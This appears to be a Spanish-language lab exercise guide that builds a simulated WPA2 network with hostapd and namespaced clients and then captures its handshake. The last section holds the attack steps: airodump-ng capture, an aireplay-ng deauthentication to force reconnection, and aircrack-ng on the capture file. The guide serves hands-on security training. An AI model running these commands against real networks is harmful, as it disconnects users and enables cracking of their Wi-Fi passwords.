NIVEL 3 - CAPTURA DE HANDSHAKE WPA2

Objetivo:
Capturar un handshake WPA2 válido entre un cliente y el AP.

Datos del escenario:
- AP: wlan1
- SSID: espectro-core
- BSSID: 52:54:46:33:48:53
- Canal: 11
- Red: 10.10.3.0/24
- Clientes: wlan1, wlan2, wlan3

Limpieza previa:
  sudo pkill hostapd || true
  sudo pkill dnsmasq || true
  sudo pkill wpa_supplicant || true
  sudo pkill dhclient || true
  sudo ip netns del level3-client1 2>/dev/null || true
  sudo ip netns del level3-client2 2>/dev/null || true
  sudo ip netns del level3-client3 2>/dev/null || true
  sudo rfkill unblock all

Preparar wlan1 para el AP:
  sudo ip addr flush dev wlan1
  sudo ip link set wlan1 down
  sudo ip link set wlan1 up
  sudo ip addr add 10.10.3.1/24 dev wlan1

Levantar AP:
  sudo hostapd -d lab/level3/level3ap.conf

Levantar DHCP:
  sudo dnsmasq --no-daemon --conf-file=lab/level3/level3dnsmasq.conf

Cliente 1:
  sudo ip netns add level3-client1
  sudo ip link set wlan1 netns level3-client1
  sudo ip -n level3-client1 link set lo up
  sudo ip netns exec level3-client1 ip link set wlan1 up
  sudo ip netns exec level3-client1 wpa_supplicant -B -i wlan1 -c lab/level3/level3cli1.conf
  sudo ip netns exec level3-client1 dhclient wlan1

Cliente 2:
  sudo ip netns add level3-client2
  sudo ip link set wlan2 netns level3-client2
  sudo ip -n level3-client2 link set lo up
  sudo ip netns exec level3-client2 ip link set wlan2 up
  sudo ip netns exec level3-client2 wpa_supplicant -B -i wlan2 -c lab/level3/level3cli2.conf
  sudo ip netns exec level3-client2 dhclient wlan2

Cliente 3:
  sudo ip netns add level3-client3
  sudo ip link set wlan3 netns level3-client3
  sudo ip -n level3-client3 link set lo up
  sudo ip netns exec level3-client3 ip link set wlan3 up
  sudo ip netns exec level3-client3 wpa_supplicant -B -i wlan3 -c lab/level3/level3cli3.conf
  sudo ip netns exec level3-client3 dhclient wlan3

Escucha para capturar handshake:
  sudo airmon-ng start [interfaz]
  sudo airodump-ng --bssid 52:54:46:33:48:53 -c 11 -w captura_nivel3 [interfaz_monitor]

Forzar reconexión de un cliente:
  sudo aireplay-ng -0 3 -a 52:54:46:33:48:53 -c [MAC_CLIENTE] [interfaz_monitor]

Validación local opcional:
  aircrack-ng captura_nivel3-01.cap
